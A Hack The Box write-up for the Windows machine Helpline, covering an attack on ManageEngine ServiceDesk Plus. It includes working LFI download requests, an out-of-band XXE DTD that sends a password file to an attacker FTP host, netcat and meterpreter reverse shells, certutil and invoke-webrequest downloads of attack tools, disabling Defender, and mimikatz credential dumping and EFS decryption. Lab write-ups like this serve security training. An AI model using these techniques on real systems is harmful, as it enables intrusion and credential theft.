---
layout: single
title: Helpline - Hack The Box
excerpt: "I did Helpline the unintended way by gaining my initial shell access as NT AUTHORITY\\SYSTEM and then working my way back to the root and user flags. Both flags were encrypted for two different users so even with a SYSTEM shell I couldn't immediately read the files and had to find the user plaintext credentials first. The credentials for user Tolu were especially hard to find: they were hidden in Windows Event Log files and I had to use a Python module to parse those."
date: 2019-08-17
classes: wide
header:
  teaser: /assets/images/htb-writeup-helpline/helpline_logo.png
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - hackthebox
  - infosec
tags:
  - windows
  - winrm
  - mimikatz
  - efs
  - ServiceDesk
  - incognito
  - tokens
  - meterpreter
  - powershell
  - postgresql
  - xxe
  - lfi
  - evtx
  - windows logs
---

![](/assets/images/htb-writeup-helpline/helpline_logo.png)

I did Helpline the unintended way by gaining my initial shell access as NT AUTHORITY\SYSTEM and then working my way back to the root and user flags. Both flags were encrypted for two different users so even with a SYSTEM shell I couldn't immediately read the files and had to find the user plaintext credentials first. The credentials for user Tolu were especially hard to find: they were hidden in Windows Event Log files and I had to use a Python module to parse those.

## Summary

- ManageEngine ServiceDesk allows guest login and we can recover an excel sheet with "hidden" credentials
- There's an LFI vunerability that let us download the SDP backup files which contains password hashes
- We're able to crack 3 credentials from the database and we can log in to the SDP app with user zachary_33258
- Using an OOB XXE vulnerability we obtain the password audit file which contains 3 other credentials
- After logging in via WinRM with user alice we reset the SDP application admin account by changing the hash in the postgresql database
- Once logged in to SDP as admin, we create a custom trigger action which executes netcat to give us a shell as NT AUTHORITY\SYSTEM
- Both user and root are EFS encrypted and we can't read them as SYSTEM
- Using meterpreter, we impersonate Leo's token and get access to admin-pass.xml which contains the administrator credential in Powershell secure strings
- After obtaining the plaintext password, we use mimikatz to recover the master key and decrypt the root flag
- The user flag is encrypted with user Tolu's credentials. We find those in the Windows log files are using python-evtx

### Portscan

```
# nmap -sC -sV -p- 10.10.10.132
PORT      STATE SERVICE       VERSION
135/tcp   open  msrpc         Microsoft Windows RPC
445/tcp   open  microsoft-ds?
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
8080/tcp  open  http-proxy    -
```

### SMB initial enumeration

SMB is not initially accessible with null sessions or the guest account.

```
# smbmap -u test -H 10.10.10.132
[+] Finding open SMB ports....
[!] Authentication error occured
[!] SMB SessionError: STATUS_LOGON_FAILURE(The attempted logon is invalid. This is either due to a bad username or authentication information.)
[!] Authentication error on 10.10.10.132
```

### ServiceDesk: Initial enumeration

The ManageEngine ServiceDesk Plus 9.3 application is running on port 8080.

![](/assets/images/htb-writeup-helpline/sdp_login.png)

The application has a guest account enabled by default and we can log in with `guest/guest`.

![](/assets/images/htb-writeup-helpline/sdp_guest.png)

The guest account has read-only access to the list of solutions.

![](/assets/images/htb-writeup-helpline/sdp_solutions.png)

One of the solution contains a password audit spreadsheet that we can download.

![](/assets/images/htb-writeup-helpline/sdp_solutions_audit.png)

The main sheet contains some statistics but nothing useful.

![](/assets/images/htb-writeup-helpline/audit_spreadsheet1.png)

I noticed that the number of sheets reported differs from the tabs shown.

![](/assets/images/htb-writeup-helpline/audit_spreadsheet2.png)

I unhid the sheet then was able to view the "hidden" data.

![](/assets/images/htb-writeup-helpline/audit_spreadsheet3.png)

![](/assets/images/htb-writeup-helpline/audit_spreadsheet4.png)

The spreadsheet contains a few passwords but none of them are working on the SDP application, SMB or WinRM.

There is an interesting note: `File containing details from subsequent audit saved to C:\Temp\Password Audit\it_logins.txt on HELPLINE`

We'll keep that file in mind for later when we find a way to read files outside of the application.

### ServiceDesk: Getting the database backup using an LFI

I found a [blog post](https://blog.netxp.fr/manageengine-deep-exploitation/) about the CVE-2017-11511 LFI vulnerability.

We can view files by using a relative path: `http://helpline:8080/fosagent/repl/download-file?basedir=4&filepath=\..\..\..\..\..\..\file`

I tried fetching `win.ini` and it didn't work but noticed that the application is running on the E: drive. So that means we won't be able to read that password audit file located on the C: drive.

![](/assets/images/htb-writeup-helpline/lfi_part1.png)

We don't even need to be authenticated to use the LFI vulnerability. The next thing is to read `sdpbackup.log` to find out what is the last backup date:

```
# curl "http://helpline:8080/fosagent/repl/download-file?basedir=4&filepath=\..\..\..\..\..\..\manageengine\servicedesk\bin\sdpbackup.log"

[...]
Zipfile created: E:\ManageEngine\ServiceDesk\bin\..\\backup\backup_postgres_9309_fullbackup_03_08_2019_09_04\backup_postgres_9309_fullbackup_03_08_2019_09_04_part_1.data
Zipfile created: E:\ManageEngine\ServiceDesk\bin\..\\backup\backup_postgres_9309_fullbackup_03_08_2019_09_04\backup_postgres_9309_fullbackup_03_08_2019_09_04_part_2.data
Backup Completed Successfully.#
#
```

So we have two backup files we will download:
- backup_postgres_9309_fullbackup_03_08_2019_09_04\backup_postgres_9309_fullbackup_03_08_2019_09_04_part_1.data
- backup_postgres_9309_fullbackup_03_08_2019_09_04\backup_postgres_9309_fullbackup_03_08_2019_09_04_part_2.data

Using the LFI again to download both files:

```
# wget "http://helpline:8080/fosagent/repl/download-file?basedir=4&filepath=\..\..\..\..\..\..\manageengine\servicedesk\backup\backup_postgres_9309_fullbackup_03_08_2019_09_04\backup_postgres_9309_fullbackup_03_08_2019_09_04_part_1.data"
[...]
2019-03-24 23:34:27 (7.80 MB/s) - ‘download-file?basedir=4&filepath=\\..\\..\\..\\..\\..\\..\\manageengine\\servicedesk\\backup\\backup_postgres_9309_fullbackup_03_08_2019_09_04\\backup_postgres_9309_fullbackup_03_08_2019_09_04_part_1.data’ saved [2889616]

# wget "http://helpline:8080/fosagent/repl/download-file?basedir=4&filepath=\..\..\..\..\..\..\manageengine\servicedesk\backup\backup_postgres_9309_fullbackup_03_08_2019_09_04\backup_postgres_9309_fullbackup_03_08_2019_09_04_part_2.data
> "
[...]
2019-03-24 23:35:01 (1.82 MB/s) - ‘download-file?basedir=4&filepath=\\..\\..\\..\\..\\..\\..\\manageengine\\servicedesk\\backup\\backup_postgres_9309_fullbackup_03_08_2019_09_04\\backup_postgres_9309_fullbackup_03_08_2019_09_04_part_2.data%0A’ saved [14468]
```

Both are zipped files:

```
# file backup_postgres_9309_fullbackup_03_08_2019_09_04_part_1.data
backup_postgres_9309_fullbackup_03_08_2019_09_04_part_1.data: Zip archive data, at least v2.0 to extract
# file backup_postgres_9309_fullbackup_03_08_2019_09_04_part_2.data
backup_postgres_9309_fullbackup_03_08_2019_09_04_part_2.data: Zip archive data, at least v2.0 to extract
```

We'll extract the files and see that we have a lot of different files, one for each table in the database:

```
/db# unzip backup_postgres_9309_fullbackup_03_08_2019_09_04_part_1.data
/db# unzip backup_postgres_9309_fullbackup_03_08_2019_09_04_part_2.data

/db# ls -l |more
total 10912
-rw-r--r--  1 root root     326 Mar  8 09:05 aaaaccadminprofile.sql
-rw-r--r--  1 root root       0 Mar  8 09:05 aaaaccbadloginstatus.sql
-rw-r--r--  1 root root       0 Mar  8 09:05 aaaaccoldpassword.sql
-rw-r--r--  1 root root       0 Mar  8 09:05 aaaaccountowner.sql
-rw-r--r--  1 root root     349 Mar  8 09:05 aaaaccount.sql
-rw-r--r--  1 root root     405 Mar  8 09:05 aaaaccountstatus.sql
-rw-r--r--  1 root root       0 Mar  8 09:05 aaaaccownerprofile.sql
-rw-r--r--  1 root root     147 Mar  8 09:05 aaaaccpassword.sql
-rw-r--r--  1 root root       0 Mar  8 09:05 aaaaccuserprofile.sql
[...]
```

The `aaalogin.sql` file contains a few login IDs and usernames, but the passwords are not there.

```
INSERT INTO AaaLogin (login_id,user_id,name,domainname) VALUES
(1, 3, N'guest', N'-');
(2, 4, N'administrator', N'-');
(302, 302, N'luis_21465', N'-');
(303, 303, N'zachary_33258', N'-');
(601, 601, N'stephen', N'-');
(602, 602, N'fiona', N'-');
(603, 603, N'mary', N'-');
(604, 604, N'anne', N'-');
```

The bcrypt hashes for those accounts are in the `aaapassword.sql` file:

```
INSERT INTO AaaPassword (password_id,password,algorithm,salt,passwdprofile_id,passwdrule_id,createdtime,factor) VALUES
(1, N'$2a$12$6VGARvoc/dRcRxOckr6WmucFnKFfxdbEMcJvQdJaS5beNK0ci0laG', N'bcrypt', N'$2a$12$6VGARvoc/dRcRxOckr6Wmu', 2, 1, 1545350288006, 12);
(302, N'$2a$12$2WVZ7E/MbRgTqdkWCOrJP.qWCHcsa37pnlK.0OyHKfd4lyDweMtki', N'bcrypt', N'$2a$12$2WVZ7E/MbRgTqdkWCOrJP.', 2, 1, 1545428506907, NULL);
(303, N'$2a$12$Em8etmNxTinGuub6rFdSwubakrWy9BEskUgq4uelRqAfAXIUpZrmm', N'bcrypt', N'$2a$12$Em8etmNxTinGuub6rFdSwu', 2, 1, 1545428808687, NULL);
(2, N'$2a$12$hmG6bvLokc9jNMYqoCpw2Op5ji7CWeBssq1xeCmU.ln/yh0OBPuDa', N'bcrypt', N'$2a$12$hmG6bvLokc9jNMYqoCpw2O', 2, 1, 1545428960671, 12);
(601, N'$2a$12$6sw6V2qSWANP.QxLarjHKOn3tntRUthhCrwt7NWleMIcIN24Clyyu', N'bcrypt', N'$2a$12$6sw6V2qSWANP.QxLarjHKO', 2, 1, 1545514864248, NULL);
(602, N'$2a$12$X2lV6Bm7MQomIunT5C651.PiqAq6IyATiYssprUbNgX3vJkxNCCDa', N'bcrypt', N'$2a$12$X2lV6Bm7MQomIunT5C651.', 2, 1, 1545515091170, NULL);
(603, N'$2a$12$gFZpYK8alTDXHPaFlK51XeBCxnvqSShZ5IO/T5GGliBGfAOxwHtHu', N'bcrypt', N'$2a$12$gFZpYK8alTDXHPaFlK51Xe', 2, 1, 1545516114589, NULL);
(604, N'$2a$12$4.iNcgnAd8Kyy7q/mgkTFuI14KDBEpMhY/RyzCE4TEMsvd.B9jHuy', N'bcrypt', N'$2a$12$4.iNcgnAd8Kyy7q/mgkTFu', 2, 1, 1545517215465, NULL);
```

To crack the hashes with hashcat, we only need to keep the first part so we end up with the following file that we feed to hashcat.

```
$2a$12$6VGARvoc/dRcRxOckr6WmucFnKFfxdbEMcJvQdJaS5beNK0ci0laG
$2a$12$2WVZ7E/MbRgTqdkWCOrJP.qWCHcsa37pnlK.0OyHKfd4lyDweMtki
$2a$12$Em8etmNxTinGuub6rFdSwubakrWy9BEskUgq4uelRqAfAXIUpZrmm
$2a$12$hmG6bvLokc9jNMYqoCpw2Op5ji7CWeBssq1xeCmU.ln/yh0OBPuDa
$2a$12$6sw6V2qSWANP.QxLarjHKOn3tntRUthhCrwt7NWleMIcIN24Clyyu
$2a$12$X2lV6Bm7MQomIunT5C651.PiqAq6IyATiYssprUbNgX3vJkxNCCDa
$2a$12$gFZpYK8alTDXHPaFlK51XeBCxnvqSShZ5IO/T5GGliBGfAOxwHtHu
$2a$12$4.iNcgnAd8Kyy7q/mgkTFuI14KDBEpMhY/RyzCE4TEMsvd.B9jHuy
```

The correct hash type is found on [https://hashcat.net/wiki/doku.php?id=example_hashes](https://hashcat.net/wiki/doku.php?id=example_hashes). We can now start our cracking session with the following command:

```
C:\bin\hashcat>hashcat64 -a 0 -m 3200 hash.txt passwords\rockyou.txt
hashcat (v5.1.0) starting...

OpenCL Platform #1: NVIDIA Corporation
======================================
* Device #1: GeForce GTX 980, 1024/4096 MB allocatable, 16MCU

Dictionary cache hit:
* Filename..: passwords\rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

$2a$12$gFZpYK8alTDXHPaFlK51XeBCxnvqSShZ5IO/T5GGliBGfAOxwHtHu:1234567890
$2a$12$Em8etmNxTinGuub6rFdSwubakrWy9BEskUgq4uelRqAfAXIUpZrmm:0987654321
$2a$12$X2lV6Bm7MQomIunT5C651.PiqAq6IyATiYssprUbNgX3vJkxNCCDa:1q2w3e4r
```

I was able to recover 3 passwords. Cross-referencing the login ID in the `aaapassword` table with the `aaalogin` information, we have the following credentials:

- `zachary_33258 / 0987654321`
- `fiona / 1q2w3e4r`
- `mary / 1234567890`

### ServiceDesk: Zachary user

The user `zachary_33258` has access to the scheduler.

![](/assets/images/htb-writeup-helpline/sdp_zachary1.png)

He can also generate an API key.

![](/assets/images/htb-writeup-helpline/sdp_zachary2.png)

### ServiceDesk: Mary user

Mary has two tickets in her queue, nothing interesting here.

![](/assets/images/htb-writeup-helpline/sdp_mary.png)

### ServiceDesk: Fiona user

Fiona also has two tickets, the 2nd one has been resolved and we see some credentials there. We make note of those but they ultimately weren't useful on this box.

![](/assets/images/htb-writeup-helpline/sdp_fiona1.png)

![](/assets/images/htb-writeup-helpline/sdp_fiona2.png)

### ServiceDesk: Reading the password audit file via OOB XXE extraction

The following [CVE-2017-9362](https://labs.integrity.pt/advisories/cve-2017-9362/index.html) talks about an XXE vulnerability in the CMDB API. The cool thing is we don't even need special privileges to use this API endpoint. Zachary has the ability to generate API keys but here I'm just using the `fiona` user and I'm not specifying any API key.

First, let's check if we can use the API endpoint `/api/cmdb/ci/list`:

![](/assets/images/htb-writeup-helpline/sdp_xxe1.png)

Ok, that works. Next let's try using the example in the blog post above. Unfortunately I got a permissions error when I used the payload from the blog post.

![](/assets/images/htb-writeup-helpline/sdp_xxe2.png)

I tried a remote DTD and even though I got an error message from the page I did see the HTTP request come in to my Kali box.

![](/assets/images/htb-writeup-helpline/sdp_xxe3.png)

![](/assets/images/htb-writeup-helpline/sdp_xxe4.png)

I then tried the following OOB extraction payload in my `xxe_file.dtd`:

```
<!ENTITY % d SYSTEM "file:///c:/Temp/Password Audit/it_logins.txt">
<!ENTITY % c "<!ENTITY rrr SYSTEM 'ftp://10.10.14.23:2121/%d;'>">
```

The server fetched the DTD from my machine then connected by FTP and sent the content of the password audit file.

![](/assets/images/htb-writeup-helpline/sdp_xxe5.png)

We now have the following additional credentials:

- `alice` / `$sys4ops@megabank!`
- `mike_adm` / `Password1`
- `dr_acc` / `dr_acc`

### ServiceDesk: Resetting the administrator password through Postgresql

The `mike_adm` and `dr_acc` accounts don't exist but `alice` does.

We can now see shares but we don't have any access to them:

```
# smbmap -d HELPLINE -u alice -p \$sys4ops@megabank! -H 10.10.10.132
[+] Finding open SMB ports....
[+] User SMB session establishd on 10.10.10.132...
[+] IP: 10.10.10.132:445	Name: helpline.htb
	Disk                                                  	Permissions
	----                                                  	-----------
	ADMIN$                                            	NO ACCESS
	C$                                                	NO ACCESS
	E$                                                	NO ACCESS
	Helpdesk_Stats                                    	NO ACCESS
	IPC$                                              	READ ONLY
```

The WinRM port is listening on this box but I prefer to use Powershell inside Windows to log in instead of the Ruby WinRM module. I have another Windows VM running that I route through my Kali VM so I don't need to flip between two VPN connections. The traffic from the Windows VM is NATed to the IP of the tun0 interface on the Kali VM.

![](/assets/images/htb-writeup-helpline/winrm_alice1.png)

The shell we have is pretty locked down: AMSI is enabled, Constrained Language mode is enabled, and Applocker is configured.

![](/assets/images/htb-writeup-helpline/winrm_alice2.png)

![](/assets/images/htb-writeup-helpline/winrm_alice3.png)

![](/assets/images/htb-writeup-helpline/winrm_alice4.png)

We know that the SDP application uses Postgresql as the database backend and that the credentials to log in to the application are stored in the database. Since we have shell access, we can try to change the database entries from the `psql.exe` application. Fortunately, this application is not blocked by AppLocker.

As shown here, we can check the `aaapassword` table:

```
[10.10.10.132]: PS E:\ManageEngine\ServiceDesk\pgsql\bin> .\psql.exe -U postgres -h 127.0.0.1 -p 65432 -d servicedesk -c "select * from aaapassword"
 password_id |                           password                           | algorithm |             salt              |
-------------+--------------------------------------------------------------+-----------+-------------------------------+
           1 | $2a$12$6VGARvoc/dRcRxOckr6WmucFnKFfxdbEMcJvQdJaS5beNK0ci0laG | bcrypt    | $2a$12$6VGARvoc/dRcRxOckr6Wmu |
         302 | $2a$12$2WVZ7E/MbRgTqdkWCOrJP.qWCHcsa37pnlK.0OyHKfd4lyDweMtki | bcrypt    | $2a$12$2WVZ7E/MbRgTqdkWCOrJP. |
         303 | $2a$12$Em8etmNxTinGuub6rFdSwubakrWy9BEskUgq4uelRqAfAXIUpZrmm | bcrypt    | $2a$12$Em8etmNxTinGuub6rFdSwu |
           2 | $2a$12$hmG6bvLokc9jNMYqoCpw2Op5ji7CWeBssq1xeCmU.ln/yh0OBPuDa | bcrypt    | $2a$12$hmG6bvLokc9jNMYqoCpw2O |
         601 | $2a$12$6sw6V2qSWANP.QxLarjHKOn3tntRUthhCrwt7NWleMIcIN24Clyyu | bcrypt    | $2a$12$6sw6V2qSWANP.QxLarjHKO |
         602 | $2a$12$X2lV6Bm7MQomIunT5C651.PiqAq6IyATiYssprUbNgX3vJkxNCCDa | bcrypt    | $2a$12$X2lV6Bm7MQomIunT5C651. |
         603 | $2a$12$gFZpYK8alTDXHPaFlK51XeBCxnvqSShZ5IO/T5GGliBGfAOxwHtHu | bcrypt    | $2a$12$gFZpYK8alTDXHPaFlK51Xe |
         604 | $2a$12$4.iNcgnAd8Kyy7q/mgkTFuI14KDBEpMhY/RyzCE4TEMsvd.B9jHuy | bcrypt    | $2a$12$4.iNcgnAd8Kyy7q/mgkTFu |
(8 rows)
```

The [documentation](https://support.servicedeskplus.com/portal/kb/articles/how-to-reset-administrator-password-in-servicedesk-plus) contains the bcrypt hash that needs to be replaced in the table to reset the password to `admin`:

- `password='$2a$12$fZUC9IK8E/AwtCxMKnCfiu830qUyYB/JRhWpi2k1vgWLC6iLFAgxa'`
- `salt='$2a$12$fZUC9IK8E/AwtCxMKnCfiu'`

```
[10.10.10.132]: PS E:\ManageEngine\ServiceDesk\pgsql\bin> .\psql.exe -U postgres -h 127.0.0.1 -p 65432 -d servicedesk -c "update aaap
assword set password ='`$2a`$12`$fZUC9IK8E/AwtCxMKnCfiu830qUyYB/JRhWpi2k1vgWLC6iLFAgxa' where password_id=2"
UPDATE 1
[10.10.10.132]: PS E:\ManageEngine\ServiceDesk\pgsql\bin> .\psql.exe -U postgres -h 127.0.0.1 -p 65432 -d servicedesk -c "update aaap
assword set salt ='`$2a`$12`$fZUC9IK8E/AwtCxMKnCfiu' where password_id=2"
UPDATE 1
```

We can now log in as `administrator` with the password `admin`. In the `Admin` tab, we'll use the *Custom Triggers* menu to gain RCE.

![](/assets/images/htb-writeup-helpline/sdp_admin1.png)

### RCE and a NT AUTHORITY\SYSTEM reverse shell

As Alice I downloaded netcat to the box even though I can't execute `nc.exe` from Alice because of Bitlocker.

![](/assets/images/htb-writeup-helpline/netcat.png)

The I created a new Custom Trigger action in SDP that'll execute `nc.exe` when a new Request is created with a subject of `pwn`.

![](/assets/images/htb-writeup-helpline/sdp_admin3.png)

![](/assets/images/htb-writeup-helpline/sdp_admin4.png)

After the request was created, I got a reverse shell as SYSTEM:

![](/assets/images/htb-writeup-helpline/system_shell.png)

### Disabling protections and grabbing the NTLM hashes

We can't read `user.txt` or `root.txt` even if we're SYSTEM because they're both EFS encrypted. We'll need the plaintext passwords for the account in order to recover the masterkey and decrypt those files.

```
C:\Users\Administrator\Desktop>type root.txt
Access is denied.

C:\Users\Administrator\Desktop>cipher /c root.txt

 Listing C:\Users\Administrator\Desktop\
 New files added to this directory will not be encrypted.

E root.txt
  Compatibility Level:
    Windows XP/Server 2003

  Users who can decrypt:
    HELPLINE\Administrator [Administrator(Administrator@HELPLINE)]
    Certificate thumbprint: FB15 4575 993A 250F E826 DBAC 79EF 26C2 11CB 77B3

  No recovery certificate found.

  Key information cannot be retrieved.

The specified file could not be decrypted.
```

```
C:\Users\tolu\Desktop>type user.txt
Access is denied.

C:\Users\tolu\Desktop>cipher /c user.txt

 Listing C:\Users\tolu\Desktop\
 New files added to this directory will not be encrypted.

E user.txt
  Compatibility Level:
    Windows XP/Server 2003

  Users who can decrypt:
    HELPLINE\tolu [tolu(tolu@HELPLINE)]
    Certificate thumbprint: 91EF 5D08 D1F7 C60A A0E4 CEE7 3E05 0639 A669 2F29

  No recovery certificate found.

  Key information cannot be retrieved.

The specified file could not be decrypted.
```

Next, I disabled the AV running on the system so I could execute Mimikatz and get the NTLM hashes and psexec back in later.

```
PS E:\ManageEngine\ServiceDesk\integration\custom_scripts> set-mppreference -disablerealtimemonitoring $true
```

```
PS C:\programdata> invoke-webrequest -uri http://10.10.14.23/mimikatz.exe -outfile mimikatz.exe

lsadump::lsa /patch
mimikatz # Domain : HELPLINE / S-1-5-21-3107372852-1132949149-763516304

RID  : 000001f4 (500)
User : Administrator
LM   :
NTLM : d5312b245d641b3fae0d07493a022622

RID  : 000003e8 (1000)
User : alice
LM   :
NTLM : 998a9de69e883618e987080249d20253

RID  : 000001f7 (503)
User : DefaultAccount
LM   :
NTLM :

RID  : 000001f5 (501)
User : Guest
LM   :
NTLM :

RID  : 000003f1 (1009)
User : leo
LM   :
NTLM : 60b05a66232e2eb067b973c889b615dd

RID  : 000003f2 (1010)
User : niels
LM   :
NTLM : 35a9de42e66dcdd5d512a796d03aef50

RID  : 000003f3 (1011)
User : tolu
LM   :
NTLM : 03e2ec7aa7e82e479be07ecd34f1603b

RID  : 000001f8 (504)
User : WDAGUtilityAccount
LM   :
NTLM : 52a344a6229f7bfa074d3052023f0b41

RID  : 000003ef (1007)
User : zachary
LM   :
NTLM : eef285f4c800bcd1ae1e84c371eeb282
```

### Get access to Leo's admin password list

I found a `admin-pass.xml` file in Leo's Desktop directory but I can't read it because it's EFS encrypted:

```
C:\Users\leo\Desktop>type admin-pass.xml
Access is denied.

C:\Users\leo\Desktop>cipher /c admin-pass.xml
cipher /c admin-pass.xml

 Listing C:\Users\leo\Desktop\
 New files added to this directory will not be encrypted.

E admin-pass.xml
  Compatibility Level:
    Windows XP/Server 2003

  Users who can decrypt:
    HELPLINE\leo [leo(leo@HELPLINE)]
    Certificate thumbprint: 66E4 033A 6EEE 1414 7D7D 9F97 6E5C D1D5 20B0 24B8
```

There's also a `run.ps1` file in the Documents folder so I assume there is some kind of scheduled job running with Leo's credentials:

```
 Directory of C:\Users\leo\Documents

12/27/2018  12:06 AM    <DIR>          .
12/27/2018  12:06 AM    <DIR>          ..
12/27/2018  08:54 PM               462 run.ps1
```

I used meterpreter with the incognito module to see the tokens present in memory.

```
C:\ProgramData>certutil -f -urlcache http://10.10.14.23/met.exe met.exe
****  Online  ****
CertUtil: -URLCache command completed successfully.

C:\ProgramData>met
```

```
Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     tun0             yes       The listen address (an interface may be specified)
   LPORT     7777             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Wildcard Target


msf5 exploit(multi/handler) > run -j
[*] Exploit running as background job 0.

[*] Started reverse TCP handler on 10.10.14.23:7777

msf5 exploit(multi/handler) > sessions 2
[*] Starting interaction with 2...

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

```
meterpreter > load incognito
Loading extension incognito...Success.

meterpreter > list_tokens -u

Delegation Tokens Available
========================================
Font Driver Host\UMFD-0
Font Driver Host\UMFD-1
HELPLINE\alice
HELPLINE\leo
NT AUTHORITY\LOCAL SERVICE
NT AUTHORITY\NETWORK SERVICE
NT AUTHORITY\SYSTEM
Window Manager\DWM-1

Impersonation Tokens Available
========================================
No tokens available
```

We see that Leo's token is in memory so we can impersonate him and download the `admin-pass.xml` file.

```
meterpreter > impersonate_token helpline\\leo
[+] Delegation token available
[+] Successfully impersonated user HELPLINE\leo

meterpreter > shell
Process 4428 created.
Channel 1 created.
Microsoft Windows [Version 10.0.17763.253]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\ProgramData>whoami
whoami
helpline\leo

C:\Users\leo\Desktop>type admin-pass.xml
type admin-pass.xml
01000000d08c9ddf0115d1118c7a00c04fc297eb01000000f2fefa98a0d84f4b917dd8a1f5889c8100000000020000000000106600000001000020000000c2d2dd6646fb78feb6f7920ed36b0ade40efeaec6b090556fe6efb52a7e847cc000000000e8000000002000020000000c41d656142bd869ea7eeae22fc00f0f707ebd676a7f5fe04a0d0932dffac3f48300000006cbf505e52b6e132a07de261042bcdca80d0d12ce7e8e60022ff8d9bc042a437a1c49aa0c7943c58e802d1c758fc5dd340000000c4a81c4415883f937970216c5d91acbf80def08ad70a02b061ec88c9bb4ecd14301828044fefc3415f5e128cfb389cbe8968feb8785914070e8aebd6504afcaa
```

This looks like a Powershell SecureString. Looking at [https://stackoverflow.com/questions/28352141/convert-a-secure-string-to-plain-text](https://stackoverflow.com/questions/28352141/convert-a-secure-string-to-plain-text) we can find a method to decrypt the SecureString and recover the plaintext. Since we are running with Leo's token, we already have the decryption key loaded in memory.

```
C:\Users\leo\Desktop>powershell
powershell
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Users\leo\Desktop> whoami
whoami
helpline\leo
PS C:\Users\leo\Desktop>

PS C:\Users\leo\Desktop> $SecurePassword = Get-Content admin-pass.xml | ConvertTo-SecureString
PS C:\Users\leo\Desktop> $UnsecurePassword = (New-Object PSCredential "administrator",$SecurePassword).GetNetworkCredential().Password
PS C:\Users\leo\Desktop> echo $UnsecurePassword

mb@letmein@SERVER#acc
```

We just found the administrator's password: `mb@letmein@SERVER#acc`

### Decrypting the root.txt flag

Now that we have plaintext password for `administrator`, we can use Mimikatz to decrypt the master key and recover the private key for the administrator user.

I followed the [https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files](https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files) guide for this part.

Step 1. Get the certificate

```
crypto::system /file:"C:\Users\Administrator\AppData\Roaming\Microsoft\SystemCertificates\My\Certificates\FB154575993A250FE826DBAC79EF26C211CB77B3" /export
[...]
Saved to file: FB154575993A250FE826DBAC79EF26C211CB77B3.der
```

Step 2. Decrypt the master key

```
dpapi::masterkey /in:"C:\users\administrator\appdata\roaming\microsoft\protect\S-1-5-21-3107372852-1132949149-763516304-500\9e78687d-d881-4ccb-8bd8-bc0a19608687" /pass:mb@letmein@SERVER#acc
[...]
[masterkey] with password: mb@letmein@SERVER#acc (normal user)
key : 8ed6519c4d09a506504c4f611203bea8979a385f8a444fe57b5d2256ee1e4eb34392a141f502cd9aeea8d2187c2525c3ae998dc3cebad81cc4e41dbb6bc65fa8
sha1: b18974052cb509a86a008869fd95388550678184
```

Step 3. Decrypt the private key

```
dpapi::capi /in:"C:\Users\Administrator\AppData\Roaming\Microsoft\Crypto\RSA\S-1-5-21-3107372852-1132949149-763516304-500\d1775a874937ca4b3cd9b8e334588333_86f90bf3-9d4c-47b0-bc79-380521b14c85" /masterkey:b18974052cb509a86a008869fd95388550678184
[...]
Exportable key : YES
Key size       : 2048
Private export : OK - 'raw_exchange_capi_0_3dd3e213-bce6-4acb-808c-a1b3227ecbde.pvk'
```

Step 4. Build & import the correct PFX

I downloaded the files to my Kali VM then used the following commands to build the PFX file:

```
openssl x509 -inform DER -outform PEM -in FB154575993A250FE826DBAC79EF26C211CB77B3.der -out public.pem
openssl rsa -inform PVK -outform PEM -in raw_exchange_capi_0_3dd3e213-bce6-4acb-808c-a1b3227ecbde.pvk -out private.pem
openssl pkcs12 -in public.pem -inkey private.pem -password pass:mimikatz -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
```

Next, I uploaded the `cert.pfx` file to the target box.

Step 5. Get the flag

```
C:\ProgramData>certutil -user -p mimikatz -importpfx cert.pfx NoChain,NoRoot
Certificate "Administrator" added to store.

CertUtil: -importPFX command completed successfully.

C:\ProgramData>type c:\users\administrator\desktop\root.txt
d8142...
```

### Looking for the tolu user password

I downloaded all the Windows log files from `c:\windows\system32\winevt\logs` to my Kali VM and used the following Python module to parse them [https://github.com/williballenthin/python-evtx](https://github.com/williballenthin/python-evtx).

```
# evtx_dump.py Security.evtx | grep tolu
<EventData><Data Name="TargetUserName">tolu</Data>
<EventData><Data Name="TargetUserName">tolu</Data>
<Data Name="CommandLine">"C:\Windows\system32\net.exe" use T: \\helpline\helpdesk_stats /USER:tolu !zaq1234567890pl!99</Data>
```

The log file contains the `tolu` user password: `!zaq1234567890pl!99`

Now we can repeat the same Mimikatz process for this user and get the `user.txt` flag:

```
C:\ProgramData>certutil -user -p mimikatz -importpfx cert.pfx NoChain,NoRoot
Certificate "tolu" added to store.

CertUtil: -importPFX command completed successfully.

C:\ProgramData>type c:\users\tolu\desktop\user.txt
0d522f...
```

